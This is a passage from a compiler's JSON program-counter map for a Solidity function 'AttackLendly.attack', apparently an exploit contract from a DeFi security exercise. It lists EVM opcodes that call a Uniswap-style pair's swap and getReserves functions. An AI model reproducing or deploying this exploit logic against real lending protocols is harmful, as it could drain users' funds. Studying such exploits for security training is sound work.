      "op": "PUSH1",
      "value": "0x1"
    },
    "1846": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1848": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1850": {
      "op": "SHL"
    },
    "1851": {
      "op": "SUB"
    },
    "1852": {
      "fn": "AttackLendly.attack",
      "offset": [
        1400,
        1406
      ],
      "op": "PUSH32",
      "path": "3",
      "value": "0x0"
    },
    "1885": {
      "op": "AND"
    },
    "1886": {
      "fn": "AttackLendly.attack",
      "offset": [
        1389,
        1407
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x20"
    },
    "1888": {
      "fn": "AttackLendly.attack",
      "offset": [
        1389,
        1407
      ],
      "op": "DUP3",
      "path": "3"
    },
    "1889": {
      "fn": "AttackLendly.attack",
      "offset": [
        1389,
        1407
      ],
      "op": "ADD",
      "path": "3"
    },
    "1890": {
      "op": "MSTORE"
    },
    "1891": {
      "fn": "AttackLendly.attack",
      "offset": [
        1340,
        1372
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "1892": {
      "fn": "AttackLendly.attack",
      "offset": [
        1340,
        1372
      ],
      "op": "SWAP4",
      "path": "3"
    },
    "1893": {
      "op": "POP"
    },
    "1894": {
      "op": "ADD"
    },
    "1895": {
      "fn": "AttackLendly.attack",
      "offset": [
        1389,
        1407
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "1897": {
      "fn": "AttackLendly.attack",
      "offset": [
        1389,
        1407
      ],
      "op": "DUP1",
      "path": "3"
    },
    "1898": {
      "fn": "AttackLendly.attack",
      "offset": [
        1389,
        1407
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "1899": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "1901": {
      "op": "NOT"
    },
    "1902": {
      "fn": "AttackLendly.attack",
      "offset": [
        1389,
        1407
      ],
      "op": "DUP2",
      "path": "3"
    },
    "1903": {
      "fn": "AttackLendly.attack",
      "offset": [
        1389,
        1407
      ],
      "op": "DUP5",
      "path": "3"
    },
    "1904": {
      "fn": "AttackLendly.attack",
      "offset": [
        1389,
        1407
      ],
      "op": "SUB",
      "path": "3"
    },
    "1905": {
      "fn": "AttackLendly.attack",
      "offset": [
        1389,
        1407
      ],
      "op": "ADD",
      "path": "3"
    },
    "1906": {
      "fn": "AttackLendly.attack",
      "offset": [
        1389,
        1407
      ],
      "op": "DUP2",
      "path": "3"
    },
    "1907": {
      "fn": "AttackLendly.attack",
      "offset": [
        1389,
        1407
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "1908": {
      "fn": "AttackLendly.attack",
      "offset": [
        1389,
        1407
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1909": {
      "fn": "AttackLendly.attack",
      "offset": [
        1389,
        1407
      ],
      "op": "DUP3",
      "path": "3"
    },
    "1910": {
      "fn": "AttackLendly.attack",
      "offset": [
        1389,
        1407
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1911": {
      "fn": "AttackLendly.attack",
      "offset": [
        1389,
        1407
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "1912": {
      "op": "PUSH4",
      "value": "0x22C0D9F"
    },
    "1917": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "1919": {
      "op": "SHL"
    },
    "1920": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "DUP3",
      "path": "3",
      "statement": 18
    },
    "1921": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "1922": {
      "fn": "AttackLendly.attack",
      "offset": [
        1389,
        1407
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "1923": {
      "op": "POP"
    },
    "1924": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1926": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1928": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1930": {
      "op": "SHL"
    },
    "1931": {
      "op": "SUB"
    },
    "1932": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1421
      ],
      "op": "PUSH32",
      "path": "3",
      "value": "0x0"
    },
    "1965": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1426
      ],
      "op": "AND",
      "path": "3"
    },
    "1966": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1426
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1967": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1426
      ],
      "op": "PUSH4",
      "path": "3",
      "value": "0x22C0D9F"
    },
    "1972": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1426
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1973": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x7C9"
    },
    "1976": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1977": {
      "fn": "AttackLendly.attack",
      "offset": [
        1427,
        1437
      ],
      "op": "DUP6",
      "path": "3"
    },
    "1978": {
      "fn": "AttackLendly.attack",
      "offset": [
        1427,
        1437
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1979": {
      "fn": "AttackLendly.attack",
      "offset": [
        1439,
        1440
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "1981": {
      "fn": "AttackLendly.attack",
      "offset": [
        1439,
        1440
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1982": {
      "fn": "AttackLendly.attack",
      "offset": [
        1450,
        1454
      ],
      "op": "ADDRESS",
      "path": "3"
    },
    "1983": {
      "fn": "AttackLendly.attack",
      "offset": [
        1450,
        1454
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1984": {
      "fn": "AttackLendly.attack",
      "offset": [
        1389,
        1407
      ],
      "op": "DUP8",
      "path": "3"
    },
    "1985": {
      "fn": "AttackLendly.attack",
      "offset": [
        1389,
        1407
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1986": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x4"
    },
    "1988": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "ADD",
      "path": "3"
    },
    "1989": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xF21"
    },
    "1992": {
      "fn": "AttackLendly.attack",
      "jump": "i",
      "offset": [
        1417,
        1462
      ],
      "op": "JUMP",
      "path": "3"
    },
    "1993": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "1994": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "1996": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "1998": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "1999": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2000": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "DUP4",
      "path": "3"
    },
    "2001": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "SUB",
      "path": "3"
    },
    "2002": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "DUP2",
      "path": "3"
    },
    "2003": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "2005": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "DUP8",
      "path": "3"
    },
    "2006": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2007": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "EXTCODESIZE",
      "path": "3"
    },
    "2008": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "2009": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2010": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "2011": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x7E3"
    },
    "2014": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "2015": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "2017": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2018": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "REVERT",
      "path": "3"
    },
    "2019": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "2020": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "POP",
      "path": "3"
    },
    "2021": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "GAS",
      "path": "3"
    },
    "2022": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "CALL",
      "path": "3"
    },
    "2023": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "2024": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2025": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "2026": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x7F7"
    },
    "2029": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "2030": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "2031": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "2033": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2034": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "RETURNDATACOPY",
      "path": "3"
    },
    "2035": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "2036": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "2038": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "REVERT",
      "path": "3"
    },
    "2039": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "2040": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "POP",
      "path": "3"
    },
    "2041": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "POP",
      "path": "3"
    },
    "2042": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "POP",
      "path": "3"
    },
    "2043": {
      "fn": "AttackLendly.attack",
      "offset": [
        1417,
        1462
      ],
      "op": "POP",
      "path": "3"
    },
    "2044": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1620
      ],
      "op": "PUSH32",
      "path": "3",
      "statement": 19,
      "value": "0x0"
    },
    "2077": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2079": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2081": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "2083": {
      "op": "SHL"
    },
    "2084": {
      "op": "SUB"
    },
    "2085": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1632
      ],
      "op": "AND",
      "path": "3"
    },
    "2086": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1632
      ],
      "op": "PUSH4",
      "path": "3",
      "value": "0x902F1AC"
    },
    "2091": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "2093": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "2094": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "DUP2",
      "path": "3"
    },
    "2095": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "PUSH4",
      "path": "3",
      "value": "0xFFFFFFFF"
    },
    "2100": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "AND",
      "path": "3"
    },
    "2101": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0xE0"
    },
    "2103": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "SHL",
      "path": "3"
    },
    "2104": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "DUP2",
      "path": "3"
    },
    "2105": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "2106": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x4"
    },
    "2108": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "ADD",
      "path": "3"
    },
    "2109": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x60"
    },
    "2111": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "2113": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "2114": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2115": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "DUP4",
      "path": "3"
    },
    "2116": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "SUB",
      "path": "3"
    },
    "2117": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "DUP2",
      "path": "3"
    },
    "2118": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "DUP7",
      "path": "3"
    },
    "2119": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "GAS",
      "path": "3"
    },
    "2120": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "STATICCALL",
      "path": "3"
    },
    "2121": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "2122": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2123": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "2124": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x859"
    },
    "2127": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "2128": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "2129": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "2131": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2132": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "RETURNDATACOPY",
      "path": "3"
    },
    "2133": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "2134": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "2136": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "REVERT",
      "path": "3"
    },
    "2137": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "2138": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "POP",
      "path": "3"
    },
    "2139": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "POP",
      "path": "3"
    },
    "2140": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "POP",
      "path": "3"
    },
    "2141": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "POP",
      "path": "3"
    },
    "2142": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "2144": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "2145": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "2146": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x1F"
    },
    "2148": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "NOT",
      "path": "3"
    },
    "2149": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x1F"
    },
    "2151": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "DUP3",
      "path": "3"
    },
    "2152": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "ADD",
      "path": "3"
    },
    "2153": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "AND",
      "path": "3"
    },
    "2154": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "DUP3",
      "path": "3"
    },
    "2155": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "ADD",
      "path": "3"
    },
    "2156": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2157": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "2159": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "2160": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "POP",
      "path": "3"
    },
    "2161": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "DUP2",
      "path": "3"
    },
    "2162": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "ADD",
      "path": "3"
    },
    "2163": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "2164": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x87D"
    },
    "2167": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "2168": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "2169": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xE84"
    },
    "2172": {
      "fn": "AttackLendly.attack",
      "jump": "i",
      "offset": [
        1616,
        1634
      ],
      "op": "JUMP",
      "path": "3"
    },
    "2173": {
      "fn": "AttackLendly.attack",
      "offset": [
        1616,
        1634
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "2174": {
      "op": "POP"
    },
    "2175": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2177": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2179": {
      "op": "PUSH1",
      "value": "0x70"
    },
    "2181": {
      "op": "SHL"
    },
    "2182": {
      "op": "SUB"
    },
    "2183": {
      "fn": "AttackLendly.attack",
      "offset": [
        1592,
        1634
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "2184": {
      "fn": "AttackLendly.attack",
      "offset": [
        1592,
        1634
      ],
      "op": "DUP2",
      "path": "3"
    },
    "2185": {
      "fn": "AttackLendly.attack",
      "offset": [
        1592,
        1634
      ],
      "op": "AND",
      "path": "3"
    },
    "2186": {
      "fn": "AttackLendly.attack",
      "offset": [
        1603,
        1611
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x2"
    },
    "2188": {
      "fn": "AttackLendly.attack",
      "offset": [
        1592,
        1634
      ],
      "op": "DUP2",
      "path": "3"
    },
    "2189": {
      "fn": "AttackLendly.attack",
      "offset": [
        1592,
        1634
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "2190": {
      "fn": "AttackLendly.attack",
      "offset": [
        1592,
        1634
      ],
      "op": "SSTORE",
      "path": "3"
    },
    "2191": {
      "fn": "AttackLendly.attack",
      "offset": [
        1592,
        1634
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "2192": {
      "fn": "AttackLendly.attack",
      "offset": [
        1592,
        1634
      ],
      "op": "AND",
      "path": "3"
    },
    "2193": {
      "fn": "AttackLendly.attack",
      "offset": [
        1593,
        1601
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x1"
    },
    "2195": {
      "fn": "AttackLendly.attack",
      "offset": [
        1592,
        1634
      ],
      "op": "SSTORE",
      "path": "3"
    },
    "2196": {
      "fn": "AttackLendly.attack",
      "offset": [
        1673,
        1676
      ],
      "op": "PUSH1",
      "path": "3",
      "statement": 20,
      "value": "0x64"
    },
    "2198": {
      "fn": "AttackLendly.attack",
      "offset": [
        1673,
        1676
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "2199": {
      "fn": "AttackLendly.attack",
      "offset": [
        1657,
        1670
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x8A1"
    },
    "2202": {
      "fn": "AttackLendly.attack",
      "offset": [
        1657,
        1670
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "2203": {
      "fn": "AttackLendly.attack",
      "offset": [
        1668,
        1670
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x63"
    },
    "2205": {
      "fn": "AttackLendly.attack",
      "offset": [
        1657,
        1670
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xDDE"
    },
    "2208": {
      "fn": "AttackLendly.attack",
      "jump": "i",
      "offset": [
        1657,
        1670
      ],
      "op": "JUMP",
      "path": "3"
    },
    "2209": {
      "fn": "AttackLendly.attack",
      "offset": [
        1657,
        1670
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "2210": {
      "fn": "AttackLendly.attack",
      "offset": [
        1657,
        1676
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x8AB"
    },
    "2213": {
      "fn": "AttackLendly.attack",
      "offset": [
        1657,
        1676
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "2214": {
      "fn": "AttackLendly.attack",
      "offset": [
        1657,
        1676
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "2215": {
      "fn": "AttackLendly.attack",
      "offset": [
        1657,
        1676
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xE0B"
    },
    "2218": {
      "fn": "AttackLendly.attack",
      "jump": "i",
      "offset": [
        1657,
        1676
      ],
      "op": "JUMP",
      "path": "3"
    },
    "2219": {
      "fn": "AttackLendly.attack",
      "offset": [
        1657,
        1676
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "2220": {
      "fn": "AttackLendly.attack",
      "offset": [
        1693,
        1711
      ],
      "op": "PUSH1",
      "path": "3",
      "statement": 21,
      "value": "0x40"
    },
    "2222": {
      "fn": "AttackLendly.attack",
      "offset": [
        1693,
        1711
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2223": {
      "fn": "AttackLendly.attack",
      "offset": [
        1693,
        1711
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "2224": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2226": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2228": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "2230": {
      "op": "SHL"
    },
    "2231": {
      "op": "SUB"
    },
    "2232": {
      "fn": "AttackLendly.attack",
      "offset": [
        1704,
        1710
      ],
      "op": "PUSH32",
      "path": "3",
      "value": "0x0"
    },
    "2265": {
      "op": "AND"
    },
    "2266": {
      "fn": "AttackLendly.attack",
      "offset": [
        1693,
        1711
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x20"
    },
    "2268": {
      "fn": "AttackLendly.attack",
      "offset": [
        1693,
        1711
      ],
      "op": "DUP3",
      "path": "3"
    },
    "2269": {
      "fn": "AttackLendly.attack",
      "offset": [
        1693,
        1711
      ],
      "op": "ADD",
      "path": "3"
    },
    "2270": {
      "op": "MSTORE"
    },
    "2271": {
      "fn": "AttackLendly.attack",
      "offset": [
        1644,
        1676
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "2272": {
      "fn": "AttackLendly.attack",
      "offset": [
        1644,
        1676
      ],
      "op": "SWAP4",
      "path": "3"
    },
    "2273": {
      "op": "POP"
    },
    "2274": {
      "op": "ADD"
    },
    "2275": {
      "fn": "AttackLendly.attack",
      "offset": [
        1693,
        1711
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "2277": {
      "fn": "AttackLendly.attack",
      "offset": [
        1693,
        1711
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2278": {
      "fn": "AttackLendly.attack",
      "offset": [
        1693,
        1711
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "2279": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "2281": {
      "op": "NOT"
    },
    "2282": {
      "fn": "AttackLendly.attack",
      "offset": [
        1693,
        1711
      ],
      "op": "DUP2",
      "path": "3"
    },
    "2283": {
      "fn": "AttackLendly.attack",
      "offset": [
        1693,
        1711
      ],
      "op": "DUP5",
      "path": "3"
    },
    "2284": {
      "fn": "AttackLendly.attack",
      "offset": [
        1693,
        1711
      ],
      "op": "SUB",
      "path": "3"
    },
    "2285": {
      "fn": "AttackLendly.attack",
      "offset": [
        1693,
        1711
      ],
      "op": "ADD",
      "path": "3"
    },
    "2286": {
      "fn": "AttackLendly.attack",
      "offset": [
        1693,
        1711
      ],
      "op": "DUP2",
      "path": "3"
    },
    "2287": {
      "fn": "AttackLendly.attack",
      "offset": [
        1693,
        1711
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "2288": {
      "fn": "AttackLendly.attack",
      "offset": [
        1693,
        1711
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "2289": {
      "fn": "AttackLendly.attack",
      "offset": [
        1693,
        1711
      ],
      "op": "DUP3",
      "path": "3"
    },
    "2290": {
      "fn": "AttackLendly.attack",
      "offset": [
        1693,
        1711
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "2291": {
      "fn": "AttackLendly.attack",
      "offset": [
        1693,
        1711
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "2292": {
      "op": "PUSH4",
      "value": "0x22C0D9F"
    },
    "2297": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "2299": {
      "op": "SHL"
    },
    "2300": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "DUP3",
      "path": "3",
      "statement": 22
    },
    "2301": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "2302": {
      "fn": "AttackLendly.attack",
      "offset": [
        1693,
        1711
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "2303": {
      "op": "POP"
    },
    "2304": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2306": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2308": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "2310": {
      "op": "SHL"
    },
